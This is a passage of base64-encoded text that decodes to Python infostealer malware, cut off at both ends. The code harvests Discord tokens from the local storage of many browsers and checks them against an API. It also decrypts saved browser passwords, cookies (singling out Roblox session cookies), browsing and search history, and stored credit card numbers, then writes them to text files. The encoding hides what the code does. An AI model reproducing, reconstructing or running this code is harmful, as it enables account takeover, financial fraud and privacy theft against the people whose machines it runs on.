ZXIgRGF0YVxcRGVmYXVsdFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ1lhbmRleCc6IHNlbGYuYXBwZGF0YSArICdcXFlhbmRleFxcWWFuZGV4QnJvd3NlclxcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnQnJhdmUnOiBzZWxmLmFwcGRhdGEgKyAnXFxCcmF2ZVNvZnR3YXJlXFxCcmF2ZS1Ccm93c2VyXFxVc2VyIERhdGFcXERlZmF1bHRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdJcmlkaXVtJzogc2VsZi5hcHBkYXRhICsgJ1xcSXJpZGl1bVxcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnfQoKICAgICAgICBmb3IgbmFtZSwgcGF0aCBpbiBwYXRocy5pdGVtcygpOgogICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6CiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBkaXNjID0gbmFtZS5yZXBsYWNlKCIgIiwgIiIpLmxvd2VyKCkKICAgICAgICAgICAgaWYgImNvcmQiIGluIHBhdGg6CiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhzZWxmLnJvYW1pbmcgKyBmJ1xce2Rpc2N9XFxMb2NhbCBTdGF0ZScpOgogICAgICAgICAgICAgICAgICAgIGZvciBmaWxuYW1lIGluIG9zLmxpc3RkaXIocGF0aCk6CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGZpbG5hbWVbLTM6XSBub3QgaW4gWyJsb2ciLCAibGRiIl06CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7cGF0aH1cXHtmaWxuYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB5IGluIHJlLmZpbmRhbGwoc2VsZi5lbmNyeXB0ZWRfcmVnZXgsIGxpbmUpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9rZW4gPSBzZWxmLmRlY3J5cHRfdmFsKGJhc2U2NC5iNjRkZWNvZGUoeS5zcGxpdCgnZFF3NHc5V2dYY1E6JylbMV0pLCBzZWxmLmdldF9tYXN0ZXJfa2V5KHNlbGYucm9hbWluZyArIGYnXFx7ZGlzY31cXExvY2FsIFN0YXRlJykpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoc2VsZi5iYXNldXJsLCBoZWFkZXJzPXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84MC4wLjM5ODcuMTQ5IFNhZmFyaS81MzcuMzYnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdBdXRob3JpemF0aW9uJzogdG9rZW59KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdWlkID0gci5qc29uKClbJ2lkJ10KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdWlkIG5vdCBpbiBzZWxmLmJjX2lkOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi50b2tlbnMuYXBwZW5kKHRva2VuKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5iY19pZC5hcHBlbmQodWlkKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgZm9yIGZpbG5hbWUgaW4gb3MubGlzdGRpcihwYXRoKToKICAgICAgICAgICAgICAgICAgICBpZiBmaWxuYW1lWy0zOl0gbm90IGluIFsibG9nIiwgImxkYiJdOgogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgIGZvciBsaW5lIGluIFt4LnN0cmlwKCkgZm9yIHggaW4gb3BlbihmJ3twYXRofVxce2ZpbG5hbWV9JywgZXJyb3JzPSdpZ25vcmUnKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gcmUuZmluZGFsbChzZWxmLnJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KHNlbGYuYmFzZXVybCwgaGVhZGVycz17CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84MC4wLjM5ODcuMTQ5IFNhZmFyaS81MzcuMzYnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnQXV0aG9yaXphdGlvbic6IHRva2VufSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdWlkID0gci5qc29uKClbJ2lkJ10KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB1aWQgbm90IGluIHNlbGYuYmNfaWQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYudG9rZW5zLmFwcGVuZCh0b2tlbikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5iY19pZC5hcHBlbmQodWlkKQoKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhzZWxmLnJvYW1pbmcgKyAiXFxNb3ppbGxhXFxGaXJlZm94XFxQcm9maWxlcyIpOgogICAgICAgICAgICBmb3IgcGF0aCwgXywgZmlsZXMgaW4gb3Mud2FsayhzZWxmLnJvYW1pbmcgKyAiXFxNb3ppbGxhXFxGaXJlZm94XFxQcm9maWxlcyIpOgogICAgICAgICAgICAgICAgZm9yIF9maWxlIGluIGZpbGVzOgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBfZmlsZS5lbmRzd2l0aCgnLnNxbGl0ZScpOgogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgIGZvciBsaW5lIGluIFt4LnN0cmlwKCkgZm9yIHggaW4gb3BlbihmJ3twYXRofVxce19maWxlfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHRva2VuIGluIHJlLmZpbmRhbGwoc2VsZi5yZWdleCwgbGluZSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLmdldChzZWxmLmJhc2V1cmwsIGhlYWRlcnM9ewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODAuMC4zOTg3LjE0OSBTYWZhcmkvNTM3LjM2JywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0F1dGhvcml6YXRpb24nOiB0b2tlbn0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVpZCA9IHIuanNvbigpWydpZCddCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdWlkIG5vdCBpbiBzZWxmLmJjX2lkOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnRva2Vucy5hcHBlbmQodG9rZW4pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuYmNfaWQuYXBwZW5kKHVpZCkKCgoKCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKCiAgICBkZWYgcmFuZG9tX2Rpcl9jcmVhdGUoc2VsZiwgX2Rpcjogc3RyIG9yIG9zLlBhdGhMaWtlID0gZ2V0dGVtcGRpcigpKToKICAgICAgICBmaWxuYW1lID0gJycuam9pbihyYW5kb20uU3lzdGVtUmFuZG9tKCkuY2hvaWNlKCdhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ekFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaMDEyMzQ1Njc4OScpIGZvciBfIGluIHJhbmdlKHJhbmRvbS5yYW5kaW50KDEwLCAyMCkpKQogICAgICAgIHBhdGggPSBvcy5wYXRoLmpvaW4oX2RpciwgZmlsbmFtZSkKICAgICAgICBvcGVuKHBhdGgsICJ4IikKICAgICAgICByZXR1cm4gcGF0aAoKCiAgICBAZXh0cmFjdF90cnkKICAgIGRlZiBzdGVhbF9wYXNzd29yZHMyKHNlbGYsIG5hbWU6IHN0ciwgcGF0aDogc3RyLCBwcm9maWxlOiBzdHIpOgogICAgICAgIHBhdGggKz0gJ1xcJyArIHByb2ZpbGUgKyAnXFxMb2dpbiBEYXRhJwogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShwYXRoKToKICAgICAgICAgICAgcmV0dXJuCgogICAgICAgIGxvZ2ludmF1bHQgPSBzZWxmLnJhbmRvbV9kaXJfY3JlYXRlKCkKICAgICAgICBjb3B5MihwYXRoLCBsb2dpbnZhdWx0KQogICAgICAgIGNvbm4gPSBzcWxpdGUzLmNvbm5lY3QobG9naW52YXVsdCkKICAgICAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpCiAgICAgICAgd2l0aCBvcGVuKG9zLnBhdGguam9pbihzZWxmLmRpciwgIkJyb3dzZXJzIiwgIkFsbCBQYXNzd29yZHMudHh0IiksICdhJywgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoKICAgICAgICAgICAgZm9yIHJlcyBpbiBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIG9yaWdpbl91cmwsIHVzZXJuYW1lX3ZhbHVlLCBwYXNzd29yZF92YWx1ZSBGUk9NIGxvZ2lucyIpLmZldGNoYWxsKCk6CiAgICAgICAgICAgICAgICB1cmwsIHVzZXJuYW1lLCBwYXNzd29yZCA9IHJlcwogICAgICAgICAgICAgICAgcGFzc3dvcmQgPSBzZWxmLmRjcnB0X3ZhbChwYXNzd29yZCwgc2VsZi5tYXN0ZXJrZXkpCiAgICAgICAgICAgICAgICBpZiB1cmwgIT0gIiI6CiAgICAgICAgICAgICAgICAgICAgZi53cml0ZShmIlVSTDoge3VybH1cbklEOiB7dXNlcm5hbWV9XG5QQVNTVzBSRDoge3Bhc3N3b3JkfVxuXG4iKQogICAgICAgIGN1cnNvci5jbG9zZSgpCiAgICAgICAgY29ubi5jbG9zZSgpCiAgICAgICAgb3MucmVtb3ZlKGxvZ2ludmF1bHQpCgogICAgQGV4dHJhY3RfdHJ5CiAgICBkZWYgc3RlYWxfY29va2llczIoc2VsZiwgbmFtZTogc3RyLCBwYXRoOiBzdHIsIHByb2ZpbGU6IHN0cik6CiAgICAgICAgcGF0aCArPSAnXFwnICsgcHJvZmlsZSArICdcXE5ldHdvcmtcXENvb2tpZXMnCiAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKHBhdGgpOgogICAgICAgICAgICByZXR1cm4KICAgICAgICBjb29raWV2YXVsdCA9IHNlbGYucmFuZG9tX2Rpcl9jcmVhdGUoKQogICAgICAgIGNvcHkyKHBhdGgsIGNvb2tpZXZhdWx0KQogICAgICAgIGNvbm4gPSBzcWxpdGUzLmNvbm5lY3QoY29va2lldmF1bHQpCiAgICAgICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQogICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oc2VsZi5kaXIsICJCcm93c2VycyIsICJBbGwgQ29va2llcy50eHQiKSwgJ2EnLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmOgogICAgICAgICAgICBmb3IgcmVzIGluIGN1cnNvci5leGVjdXRlKCJTRUxFQ1QgaG9zdF9rZXksIG5hbWUsIHBhdGgsIGVuY3J5cHRlZF92YWx1ZSxleHBpcmVzX3V0YyBGUk9NIGNvb2tpZXMiKS5mZXRjaGFsbCgpOgogICAgICAgICAgICAgICAgaG9zdF9rZXksIG5hbWUsIHBhdGgsIGVuY3J5cHRlZF92YWx1ZSwgZXhwaXJlc191dGMgPSByZXMKICAgICAgICAgICAgICAgIHZhbHVlID0gc2VsZi5kY3JwdF92YWwoZW5jcnlwdGVkX3ZhbHVlLCBzZWxmLm1hc3RlcmtleSkKICAgICAgICAgICAgICAgIGlmIGhvc3Rfa2V5IGFuZCBuYW1lIGFuZCB2YWx1ZSAhPSAiIjoKICAgICAgICAgICAgICAgICAgICBmLndyaXRlKCJ7fVx0e31cdHt9XHR7fVx0e31cdHt9XHR7fVxuIi5mb3JtYXQoCiAgICAgICAgICAgICAgICAgICAgICAgIGhvc3Rfa2V5LCAnRkFMU0UnIGlmIGV4cGlyZXNfdXRjID09IDAgZWxzZSAnVFJVRScsIHBhdGgsICdGQUxTRScgaWYgaG9zdF9rZXkuc3RhcnRzd2l0aCgnLicpIGVsc2UgJ1RSVUUnLCBleHBpcmVzX3V0YywgbmFtZSwgdmFsdWUpKQogICAgICAgIGN1cnNvci5jbG9zZSgpCiAgICAgICAgY29ubi5jbG9zZSgpCiAgICAgICAgb3MucmVtb3ZlKGNvb2tpZXZhdWx0KQoKCgoKCgoKCiAgICBAZXh0cmFjdF90cnkKICAgIGRlZiBzdGVhbF9wYXNzd29yZHMoc2VsZik6CiAgICAgICAgZiA9IG9wZW4obnRwYXRoLmpvaW4oc2VsZi5kaXIsICdHb29nbGUnLCAnUGFzc3dvcmRzLnR4dCcpLCAndycsIGVuY29kaW5nPSJjcDQzNyIsIGVycm9ycz0naWdub3JlJykKICAgICAgICBmb3IgcHJvZiBpbiBvcy5saXN0ZGlyKHNlbGYuY2hybW11c2VyZHR0KToKICAgICAgICAgICAgaWYgcmUubWF0Y2goc2VsZi5jaHJtcmd4LCBwcm9mKToKICAgICAgICAgICAgICAgIGxvZ2luX2RiID0gbnRwYXRoLmpvaW4oc2VsZi5jaHJtbXVzZXJkdHQsIHByb2YsICdMb2dpbiBEYXRhJykKICAgICAgICAgICAgICAgIGxvZ2luID0gc2VsZi5jcjM0dDNfZjFsa2VzKCkKCiAgICAgICAgICAgICAgICBzaHV0aWwuY29weTIobG9naW5fZGIsIGxvZ2luKQogICAgICAgICAgICAgICAgY29ubiA9IHNxbGl0ZTMuY29ubmVjdChsb2dpbikKICAgICAgICAgICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgICAgICAgICAgICAgIGN1cnNvci5leGVjdXRlKCJTRUxFQ1QgYWN0aW9uX3VybCwgdXNlcm5hbWVfdmFsdWUsIHBhc3N3b3JkX3ZhbHVlIEZST00gbG9naW5zIikKCiAgICAgICAgICAgICAgICBmb3IgciBpbiBjdXJzb3IuZmV0Y2hhbGwoKToKICAgICAgICAgICAgICAgICAgICB1cmwgPSByWzBdCiAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWUgPSByWzFdCiAgICAgICAgICAgICAgICAgICAgZW5jcnlwdGVkX3Bhc3N3b3JkID0gclsyXQogICAgICAgICAgICAgICAgICAgIGRlY3J5cHRlZF9wYXNzd29yZCA9IHNlbGYuZGNycHRfdmFsKGVuY3J5cHRlZF9wYXNzd29yZCwgc2VsZi5jaHJvbWVfa2V5KQogICAgICAgICAgICAgICAgICAgIGlmIHVybCAhPSAiIjoKICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZShmIlVSTDoge3VybH1cbklEOiB7dXNlcm5hbWV9XG5QQVNTVzBSRDoge2RlY3J5cHRlZF9wYXNzd29yZH1cblxuIikKCiAgICAgICAgICAgICAgICBjdXJzb3IuY2xvc2UoKQogICAgICAgICAgICAgICAgY29ubi5jbG9zZSgpCiAgICAgICAgICAgICAgICBvcy5yZW1vdmUobG9naW4pCiAgICAgICAgZi5jbG9zZSgpCgoKCiAgICBAZXh0cmFjdF90cnkKICAgIGRlZiBzdGVhbF9jb29raWVzKHNlbGYpOgogICAgICAgIGYgPSBvcGVuKG50cGF0aC5qb2luKHNlbGYuZGlyLCAnR29vZ2xlJywgJ0Nvb2tpZXMudHh0JyksICd3JywgZW5jb2Rpbmc9ImNwNDM3IiwgZXJyb3JzPSdpZ25vcmUnKQogICAgICAgIGZvciBwcm9mIGluIG9zLmxpc3RkaXIoc2VsZi5jaHJtbXVzZXJkdHQpOgoKICAgICAgICAgICAgaWYgcmUubWF0Y2goc2VsZi5jaHJtcmd4LCBwcm9mKToKCiAgICAgICAgICAgICAgICBsb2dpbl9kYiA9IG50cGF0aC5qb2luKHNlbGYuY2hybW11c2VyZHR0LCBwcm9mLCAnTmV0d29yaycsICdjb29raWVzJykKICAgICAgICAgICAgICAgIGxvZ2luID0gc2VsZi5jcjM0dDNfZjFsa2VzKCkKCgogICAgICAgICAgICAgICAgc2h1dGlsLmNvcHkyKGxvZ2luX2RiLCBsb2dpbikKICAgICAgICAgICAgICAgIGNvbm4gPSBzcWxpdGUzLmNvbm5lY3QobG9naW4pCiAgICAgICAgICAgICAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpCiAgICAgICAgICAgICAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIGhvc3Rfa2V5LCBuYW1lLCBlbmNyeXB0ZWRfdmFsdWUgZnJvbSBjb29raWVzIikKCiAgICAgICAgICAgICAgICBmb3IgciBpbiBjdXJzb3IuZmV0Y2hhbGwoKToKICAgICAgICAgICAgICAgICAgICBob3N0ID0gclswXQogICAgICAgICAgICAgICAgICAgIHVzZXIgPSByWzFdCiAgICAgICAgICAgICAgICAgICAgZGVjcnlwdGVkX2Nvb2tpZSA9IHNlbGYuZGNycHRfdmFsKHJbMl0sIHNlbGYuY2hyb21lX2tleSkKICAgICAgICAgICAgICAgICAgICBpZiBob3N0ICE9ICIiOgogICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKGYie2hvc3R9CVRSVUUiKyIJCSIrIGYiL0ZBTFNFCTI1OTc1NzM0NTYJe3VzZXJ9CXtkZWNyeXB0ZWRfY29va2llfVxuIikKICAgICAgICAgICAgICAgICAgICBpZiAnX3xXQVJOSU5HOi1ETy1OT1QtU0hBUkUtVEhJUy4tLVNoYXJpbmctdGhpcy13aWxsLWFsbG93LXNvbWVvbmUtdG8tbG9nLWluLWFzLXlvdS1hbmQtdG8tc3RlYWwteW91ci1ST0JVWC1hbmQtaXRlbXMufF8nIGluIGRlY3J5cHRlZF9jb29raWU6CiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYucm9ibG94Y29va2llcy5hcHBlbmQoZGVjcnlwdGVkX2Nvb2tpZSkKCiAgICAgICAgICAgICAgICBjdXJzb3IuY2xvc2UoKQogICAgICAgICAgICAgICAgY29ubi5jbG9zZSgpCiAgICAgICAgICAgICAgICBvcy5yZW1vdmUobG9naW4pCiAgICAgICAgZi5jbG9zZSgpCgogICAgZGVmIHN0ZWFsX2hpc3RvcnkyKHNlbGYsIG5hbWU6IHN0ciwgcGF0aDogc3RyLCBwcm9maWxlOiBzdHIpOgogICAgICAgIHBhdGggKz0gJ1xcJyArIHByb2ZpbGUgKyAnXFxIaXN0b3J5JwogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShwYXRoKToKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgaGlzdG9yeXZhdWx0ID0gc2VsZi5yYW5kb21fZGlyX2NyZWF0ZSgpCiAgICAgICAgY29weTIocGF0aCwgaGlzdG9yeXZhdWx0KQogICAgICAgIGNvbm4gPSBzcWxpdGUzLmNvbm5lY3QoaGlzdG9yeXZhdWx0KQogICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgICAgICB3aXRoIG9wZW4ob3MucGF0aC5qb2luKHNlbGYuZGlyLCAiQnJvd3NlcnMiLCAiQWxsIEhpc3RvcnkudHh0IiksICdhJywgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoKICAgICAgICAgICAgc2l0ZXMgPSBbXQogICAgICAgICAgICBmb3IgcmVzIGluIGN1cnNvci5leGVjdXRlKCJTRUxFQ1QgdXJsLCB0aXRsZSwgdmlzaXRfY291bnQsIGxhc3RfdmlzaXRfdGltZSBGUk9NIHVybHMiKS5mZXRjaGFsbCgpOgogICAgICAgICAgICAgICAgdXJsLCB0aXRsZSwgdmlzaXRfY291bnQsIGxhc3RfdmlzaXRfdGltZSA9IHJlcwogICAgICAgICAgICAgICAgaWYgdXJsIGFuZCB0aXRsZSBhbmQgdmlzaXRfY291bnQgYW5kIGxhc3RfdmlzaXRfdGltZSAhPSAiIjoKICAgICAgICAgICAgICAgICAgICBzaXRlcy5hcHBlbmQoKHVybCwgdGl0bGUsIHZpc2l0X2NvdW50LCBsYXN0X3Zpc2l0X3RpbWUpKQogICAgICAgICAgICBzaXRlcy5zb3J0KGtleT1sYW1iZGEgeDogeFszXSwgcmV2ZXJzZT1UcnVlKQogICAgICAgICAgICBmb3Igc2l0ZSBpbiBzaXRlczoKICAgICAgICAgICAgICAgIGYud3JpdGUoIlZpc2l0IENvdW50OiB7Ojw2fSBUaXRsZTogezo8NDB9XG4iLmZvcm1hdChzaXRlWzJdLCBzaXRlWzFdKSkKICAgICAgICBjdXJzb3IuY2xvc2UoKQogICAgICAgIGNvbm4uY2xvc2UoKQogICAgICAgIG9zLnJlbW92ZShoaXN0b3J5dmF1bHQpCgogICAgZGVmIHN0ZWFsX2NjMihzZWxmLCBuYW1lOiBzdHIsIHBhdGg6IHN0ciwgcHJvZmlsZTogc3RyKToKICAgICAgICBwYXRoICs9ICdcXCcgKyBwcm9maWxlICsgJ1xcV2ViIERhdGEnCiAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKHBhdGgpOgogICAgICAgICAgICByZXR1cm4KICAgICAgICBjcmVkaXRfY2FyZF92YXVsdCA9IHNlbGYucmFuZG9tX2Rpcl9jcmVhdGUoKQogICAgICAgIGNvcHkyKHBhdGgsIGNyZWRpdF9jYXJkX3ZhdWx0KQogICAgICAgIGNvbm4gPSBzcWxpdGUzLmNvbm5lY3QoY3JlZGl0X2NhcmRfdmF1bHQpCiAgICAgICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQogICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oc2VsZi5kaXIsICJCcm93c2VycyIsICJBbGwgQ3JlZGl0Y2FyZHMudHh0IiksICdhJywgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoKICAgICAgICAgICAgZm9yIHJlcyBpbiBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIG5hbWVfb25fY2FyZCwgZXhwaXJhdGlvbl9tb250aCwgZXhwaXJhdGlvbl95ZWFyLCBjYXJkX251bWJlcl9lbmNyeXB0ZWQgRlJPTSBjcmVkaXRfY2FyZHMiKS5mZXRjaGFsbCgpOgogICAgICAgICAgICAgICAgbmFtZV9vbl9jYXJkLCBleHBpcmF0aW9uX21vbnRoLCBleHBpcmF0aW9uX3llYXIsIGNhcmRfbnVtYmVyX2VuY3J5cHRlZCA9IHJlcwogICAgICAgICAgICAgICAgaWYgbmFtZV9vbl9jYXJkIGFuZCBjYXJkX251bWJlcl9lbmNyeXB0ZWQgIT0gIiI6CiAgICAgICAgICAgICAgICAgICAgZi53cml0ZSgKICAgICAgICAgICAgICAgICAgICAgICAgZiJOYW1lOiB7bmFtZV9vbl9jYXJkfSAgIEV4cGlyYXRpb24gTW9udGg6IHtleHBpcmF0aW9uX21vbnRofSAgIEV4cGlyYXRpb24gWWVhcjoge2V4cGlyYXRpb25feWVhcn0gICBDYXJkIE51bWJlcjoge3NlbGYuZGNycHRfdmFsKGNhcmRfbnVtYmVyX2VuY3J5cHRlZCwgc2VsZi5tYXN0ZXJrZXkpfVxuIikKICAgICAgICBmLmNsb3NlKCkKICAgICAgICBjdXJzb3IuY2xvc2UoKQogICAgICAgIGNvbm4uY2xvc2UoKQogICAgICAgIG9zLnJlbW92ZShjcmVkaXRfY2FyZF92YXVsdCkKCgogICAgQGV4dHJhY3RfdHJ5CiAgICBkZWYgc3RlYWxfaGlzdG9yeShzZWxmKToKICAgICAgICBmID0gb3BlbihudHBhdGguam9pbihzZWxmLmRpciwgJ0dvb2dsZScsICdIaXN0b3J5LnR4dCcpLCAndycsIGVuY29kaW5nPSJjcDQzNyIsIGVycm9ycz0naWdub3JlJykKCiAgICAgICAgZGVmIHh0cmFjdHdiaGlzdChkYl9jdXJzb3IpOgogICAgICAgICAgICB3ZWIgPSAiIgogICAgICAgICAgICBkYl9jdXJzb3IuZXhlY3V0ZSgnU0VMRUNUIHRpdGxlLCB1cmwsIGxhc3RfdmlzaXRfdGltZSBGUk9NIHVybHMnKQogICAgICAgICAgICBmb3IgaXRlbSBpbiBkYl9jdXJzb3IuZmV0Y2hhbGwoKToKICAgICAgICAgICAgICAgIHdlYiArPSBmIlNlYXJjaCBUaXRsZToge2l0ZW1bMF19XG5VUkw6IHtpdGVtWzFdfVxuTEFTVCBWSVNJVCBUSU1FOiB7c2VsZi5jbnZlcnR0aW0oaXRlbVsyXSkuc3RyZnRpbWUoJyVZLyVtLyVkIC0gJUg6JU06JVMnKX1cblxuIgogICAgICAgICAgICByZXR1cm4gd2ViCgoKICAgICAgICBkZWYgeHRyYWN0d2JzM3JjaChkYl9jdXJzb3IpOgogICAgICAgICAgICBkYl9jdXJzb3IuZXhlY3V0ZSgnU0VMRUNUIHRlcm0gRlJPTSBrZXl3b3JkX3NlYXJjaF90ZXJtcycpCiAgICAgICAgICAgIHNlYXJjaF90ZXJtcyA9ICIiCgogICAgICAgICAgICBmb3IgaXRlbSBpbiBkYl9jdXJzb3IuZmV0Y2hhbGwoKToKICAgICAgICAgICAgICAgIGlmIGl0ZW1bMF0gIT0gIiI6CiAgICAgICAgICAgICAgICAgICAgc2VhcmNoX3Rlcm1zICs9IGYie2l0ZW1bMF19XG4iCgogICAgICAgICAgICByZXR1cm4gc2VhcmNoX3Rlcm1zCgoKICAgICAgICBmb3IgcHJvZiBpbiBvcy5saXN0ZGlyKHNlbGYuY2hybW11c2VyZHR0KToKCiAgICAgICAgICAgIGlmIHJlLm1hdGNoKHNlbGYuY2hybXJneCwgcHJvZik6CgogICAgICAgICAgICAgICAgbG9naW5fZGIgPSBudHBhdGguam9pbihzZWxmLmNocm1tdXNlcmR0dCwgcHJvZiwgJ0hpc3RvcnknKQogICAgICAgICAgICAgICAgbG9naW4gPSBzZWxmLmNyMzR0M19mMWxrZXMoKQoKICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5Mihsb2dpbl9kYiwgbG9naW4pCiAgICAgICAgICAgICAgICBjb25uID0gc3FsaXRlMy5jb25uZWN0KGxvZ2luKQogICAgICAgICAgICAgICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQoKCiAgICAgICAgICAgICAgICBzZWFyY2hfaGlzdG9yeSA9IHh0cmFjdHdiczNyY2goY3Vyc29yKQogICAgICAgICAgICAgICAgd2ViX2hpc3RvcnkgPSB4dHJhY3R3Ymhpc3QoY3Vyc29yKQoKICAgICAgICAgICAgICAgIGYud3JpdG